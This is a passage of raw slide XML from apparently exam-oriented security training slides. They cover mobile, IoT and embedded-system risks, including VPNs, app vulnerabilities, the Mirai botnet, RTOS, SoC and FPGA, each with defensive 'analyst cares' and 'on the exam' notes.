                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because mobile endpoints extend the attack surface into uncontrolled networks, so enforcing VPN use, securing access points, and accounting for cellular weaknesses are key to protecting data in transit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for items linking mobile risk to insecure Wi-Fi access points, the protective role of VPNs, and the weakness of older cellular standards.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462</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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MOBILE AND IOT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Mobile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Access points</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Any place where a device connects via Wi-Fi, then into the network infrastructure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Common place for vulnerabilities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463</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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MOBILE AND IOT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Mobile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VPNs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Virtual private network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Establish secure connection using insecure access point</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464</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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MOBILE AND IOT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Mobile (3)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Network vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Mobile device has to connect to IT infrastructure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Wi-Fi or cellular</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Older cellular technologies were very insecure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Newer technologies are more secure and use encryption</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465</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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MOBILE AND IOT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Mobile (4)</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Device vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Securing mobile devices is challenging</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Provisioned for multi-use</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Can’t secure one device for many different uses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466</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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MOBILE AND IOT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Mobile (5)</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Operating system vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Operating systems update frequently</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Competition between OS manufacturers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Patch bugs and security vulnerabilities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467</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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MOBILE AND IOT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Mobile (6)</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App vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Improper platform usage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Insecure data storage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Insecure authentication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Insecure authorization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Code quality vulnerabilities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468</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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MOBILE AND IOT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Internet of Things (IoT)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The Internet of Things refers to the growing population of small, often single-purpose devices that connect to the Internet and operate autonomously, such as cameras, sensors, and smart appliances. These devices carry an increased risk of compromise because they are ubiquitous, users are frequently unconcerned with their security, and many ship without hardening, default credentials, or a practical way to patch.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Compromised IoT devices are commonly conscripted into a botnet, a collection of hijacked devices controlled by an attacker to launch distributed denial-of-service (DDoS) attacks. The Mirai botnet is the classic example: malware that scanned for insecure IoT devices using default logins and assembled them into a network that carried out massive, successful DDoS attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because IoT devices are easy footholds and DDoS weapons, so inventorying them, changing defaults, segmenting them onto isolated networks, and monitoring their traffic are essential defensive steps.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect the Mirai botnet cited as the example, with questions on why insecure, unhardened IoT devices enable botnets and DDoS attacks.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469</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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MOBILE AND IOT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Internet of Things (IoT)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Smaller devices connecting to the Internet and doing things autonomously</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Increased risk of compromise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470</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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MOBILE AND IOT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Internet of Things (IoT)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Botnet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Collection of compromised devices used to launch a DDoS attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Mirai botnet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Malware that compromised a lot of insecure IoT devices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Successful DDoS attack</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471</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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MOBILE AND IOT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Internet of Things (IoT) (3)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IoT devices are ubiquitous</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Users often not concerned about security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Many devices are not hardened</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Default credentials are easy to find</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472</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EMBEDDED AND FIRMWARE SYSTEMS (RTOS, SOC, AND FPGA)</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Embedded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An embedded system is special-purpose software running on a low-power processor built into a larger product to perform a dedicated function, such as a controller inside an appliance or an industrial machine. These systems often have no external storage, with their software burned directly into firmware, and in some cases the logic is implemented in hardware only.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This constrained design gives embedded systems a very limited ability to be monitored, updated, or patched, so a vulnerability discovered after deployment may persist for the life of the device. Their long service lives and lack of visibility make them a lingering, hard-to-remediate risk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because embedded devices can host unpatched flaws indefinitely, so compensating controls like network segmentation and traffic monitoring are often the only realistic protection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions emphasize embedded systems' firmware-based software and their limited capacity to be monitored or patched as the core security concern.</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473</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EMBEDDED AND FIRMWARE SYSTEMS (RTOS, SOC, AND FPGA)</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Embedded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Special-purpose software</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Low-power processor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Often no external storage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Software can be burned into the firmware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Could just be hardware only</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Limited ability to monitor or patch</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474</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EMBEDDED AND FIRMWARE SYSTEMS (RTOS, SOC, AND FPGA)</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Real-time Operating System (RTOS)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A real-time operating system is designed to process input and produce output within strict, guaranteed time bounds, making it suitable for devices that require low-latency, deterministic response. RTOS platforms run in vehicles, manufacturing equipment, aviation systems, and medical devices, where a delayed response is not merely inconvenient but potentially catastrophic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because the defining feature is timing, vulnerabilities in an RTOS are especially serious when they threaten the underlying performance guarantees, allowing an attacker to introduce delays, disrupt scheduling, or crash a time-critical process. Exploitation can therefore translate directly into physical or safety consequences rather than just data loss.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because RTOS-driven systems are often safety-critical and difficult to take offline for patching, so protecting their real-time behavior and isolating them from general networks is a priority.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for RTOS associated with low-latency, safety-critical devices and questions where vulnerabilities threaten timing and performance guarantees.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475</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EMBEDDED AND FIRMWARE SYSTEMS (RTOS, SOC, AND FPGA)</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Real-time Operating System (RTOS)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Devices that require low-latency input processing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Vehicles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Manufacturing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Aviation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Medical</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Vulnerabilities allow threats to underlying performance guarantees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476</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EMBEDDED AND FIRMWARE SYSTEMS (RTOS, SOC, AND FPGA)</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System on a Chip (SoC)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A system on a chip integrates the software and multiple hardware components, such as the CPU, memory, and I/O controllers, onto a single integrated circuit. This tight integration makes SoCs efficient and cost-effective, which is why they are widely used in special-purpose and mobile applications where space, power, and price are constrained.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The trade-off is that a vulnerability in an SoC can affect the entire integrated environment, because the hardware and software share one chip and are difficult to isolate or patch independently. A flaw at that level may compromise everything the chip controls at once.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because SoC vulnerabilities have broad blast radius and are often unpatchable in the field, so they factor heavily into risk assessments for the many devices that depend on them.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect SoC defined as hardware and software on one chip, with the exam stressing that a single vulnerability can affect the whole integrated environment.</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477</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EMBEDDED AND FIRMWARE SYSTEMS (RTOS, SOC, AND FPGA)</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System on a Chip (SoC)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Software and hardware integrated on a single chip</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Used in special-purpose applications</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SoC is efficient and cost effective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Vulnerabilities can affect the entire SoC environment (hardware and software)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478</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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EMBEDDED AND FIRMWARE SYSTEMS (RTOS, SOC, AND FPGA)</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Field Programmable Gate Array (FPGA)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A field programmable gate array is a reconfigurable chip that combines characteristics of an SoC and an embedded system, offering hardware that can be modified and reprogrammed after deployment in the field. Reprogramming typically requires a special device to overwrite the firmware or bitstream, which makes FPGAs upgradable and cost-effective because the same hardware can be repurposed rather than replaced.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  That flexibility is also a weakness: the ability to rewrite the chip's logic means an attacker who can push a malicious bitstream may alter the device's fundamental behavior, and the relative simplicity of some designs can leave exploitable gaps. The reprogramming pathway itself becomes a target that must be protected.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because FPGA reconfigurability is a double-edged feature, so controlling who can update the firmware and validating bitstream integrity are essential to keeping the hardware trustworthy.</a:t>
            </a:r>
          </a:p>
